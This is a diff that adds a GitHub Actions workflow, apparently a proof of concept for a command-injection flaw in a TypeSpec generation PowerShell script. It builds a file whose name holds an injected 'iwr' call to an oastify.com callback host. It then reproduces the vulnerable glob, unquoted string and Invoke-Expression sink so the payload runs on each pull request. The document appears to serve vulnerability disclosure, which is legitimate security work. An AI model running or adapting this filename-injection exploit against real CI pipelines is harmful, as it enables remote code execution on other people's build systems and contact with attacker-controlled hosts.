@@ -1,0 +1,61 @@
+name: TSP CI RCE Demo
+
+on:
+  pull_request:
+
+jobs:
+  demo:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Reproduce Invoke-Expression Injection (Generate.ps1:82,96,109)
+        shell: pwsh
+        run: |
+          # --- REPLACE WITH YOUR WEBHOOK URL FROM STEP 3 ---
+          $WEBHOOK = "https://0bcpgts0lvvj0jeq9x3hk8ouclic61.oastify.com"
+
+          Write-Host "::group::Step 1 — Create weaponized filename in TempTypeSpecFiles"
+          $innerFolder = "Evil.Management"
+          $npmWorkingDir = "TempTypeSpecFiles/$innerFolder"
+          New-Item -ItemType Directory -Force -Path $npmWorkingDir | Out-Null
+
+          # The filename is the payload. Content of the file is irrelevant.
+          # ';' = PowerShell statement separator
+          # '#' = PowerShell line comment (swallows the trailing --emit garbage)
+          $weaponizedFile = "$npmWorkingDir/client.tsp; iwr $WEBHOOK?proof=rce #"
+          Set-Content -LiteralPath $weaponizedFile -Value "// benign content"
+          Write-Host "Created: $weaponizedFile"
+          Write-Host "::endgroup::"
+
+          Write-Host "::group::Step 2 — Generate.ps1:82 — glob-resolve from attacker dir"
+          # ============================================================
+          # THIS IS THE EXACT CODE FROM TypeSpec-Project-Generate.ps1:82
+          # ============================================================
+          $mainTypeSpecFile = if (Test-Path "$npmWorkingDir/client.*") {
+              Resolve-Path "$npmWorkingDir/client.*"
+          } else {
+              Resolve-Path "$npmWorkingDir/main.*"
+          }
+          Write-Host "mainTypeSpecFile = $mainTypeSpecFile"
+          Write-Host "::endgroup::"
+
+          Write-Host "::group::Step 3 — Generate.ps1:96 — unquoted interpolation"
+          # ============================================================
+          # THIS IS THE EXACT CODE FROM TypeSpec-Project-Generate.ps1:96
+          # ============================================================
+          $emitterName = "@azure-tools/typespec-autorest"
+          $typespecCompileCommand = "npx tsp compile $mainTypeSpecFile --emit $emitterName"
+          Write-Host "Command to be evaluated by Invoke-Expression:"
+          Write-Host "  $typespecCompileCommand"
+          Write-Host "::endgroup::"
+
+          Write-Host "::group::Step 4 — Generate.ps1:109 — Invoke-Expression (VULNERABLE SINK)"
+          # ============================================================
+          # THIS IS THE EXACT CODE FROM TypeSpec-Project-Generate.ps1:109
+          # ============================================================
+          Invoke-Expression $typespecCompileCommand
+          Write-Host "::endgroup::"
+
+          Write-Host "::notice:: If you see this message, the injected iwr command ran SUCCESSFULLY."
+          Write-Host "::notice:: Check your webhook.site dashboard for the callback."
